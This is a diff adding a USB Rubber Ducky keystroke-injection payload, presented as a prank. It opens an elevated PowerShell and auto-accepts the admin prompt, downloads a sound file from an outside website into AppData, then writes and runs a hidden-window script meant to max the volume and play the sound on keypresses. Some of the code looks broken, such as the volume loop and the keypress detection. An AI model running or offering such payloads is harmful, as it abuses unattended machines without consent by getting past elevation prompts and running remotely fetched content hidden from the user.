@@ -1,0 +1,124 @@
+REM Rubber Ducky Payload to play a sound for every keypress and set volume to 100%
+
+DELAY 2000
+REM Open PowerShell as Administrator
+GUI r
+DELAY 500
+STRING powershell -Command "Start-Process powershell -Verb runAs"
+ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+
+REM Download the MP3 file to AppData
+STRING $mp3Path = "$Env:APPDATA\dry-fart.mp3"
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri 'https://www.myinstants.com/media/sounds/dry-fart.mp3' -OutFile $mp3Path
+ENTER
+DELAY 5000
+
+REM Create the PowerShell script for keypress detection, MP3 playback, and volume adjustment
+STRING $scriptPath = "$Env:APPDATA\keypress-sound.ps1"
+ENTER
+DELAY 500
+STRING @'
+ENTER
+DELAY 100
+
+REM Set volume to 100% using SendKeys
+STRING $vol = 100
+ENTER
+STRING while ((New-Object -ComObject WScript.Shell).SendKeys([char]175)) {
+ENTER
+DELAY 100
+STRING Start-Sleep -Milliseconds 100
+ENTER
+DELAY 100
+STRING if ($vol -le 100) { break }
+ENTER
+STRING }
+
+REM Add the Windows Media Player-based MP3 player script
+STRING Add-Type -TypeDefinition @"
+ENTER
+DELAY 100
+STRING using System;
+ENTER
+DELAY 100
+STRING using System.Runtime.InteropServices;
+ENTER
+DELAY 100
+STRING using WMPLib;
+ENTER
+DELAY 100
+STRING public class SoundPlayer {
+ENTER
+DELAY 100
+STRING private static WindowsMediaPlayer player = new WindowsMediaPlayer();
+ENTER
+DELAY 100
+STRING public static void Play(string path) {
+ENTER
+DELAY 100
+STRING player.URL = path;
+ENTER
+DELAY 100
+STRING player.controls.play();
+ENTER
+DELAY 100
+STRING while (player.playState != WMPPlayState.wmppsStopped) {
+ENTER
+DELAY 100
+STRING System.Threading.Thread.Sleep(100);
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 100
+STRING "@
+ENTER
+
+REM Add keypress detection script
+STRING while ($true) {
+ENTER
+DELAY 100
+STRING for ($i = 1; $i -le 255; $i++) {
+ENTER
+DELAY 100
+STRING if ([Console]::KeyAvailable) {
+ENTER
+DELAY 100
+STRING [SoundPlayer]::Play("$mp3Path");
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 100
+STRING }
+ENTER
+DELAY 100
+STRING Start-Sleep -Milliseconds 10
+ENTER
+DELAY 100
+STRING }
+ENTER
+
+STRING '@ > $scriptPath
+ENTER
+DELAY 1000
+
+REM Run the PowerShell script in the background
+STRING powershell -WindowStyle Hidden -File $scriptPath
+ENTER
+DELAY 2000
+
+REM Exit PowerShell
+STRING exit
+ENTER
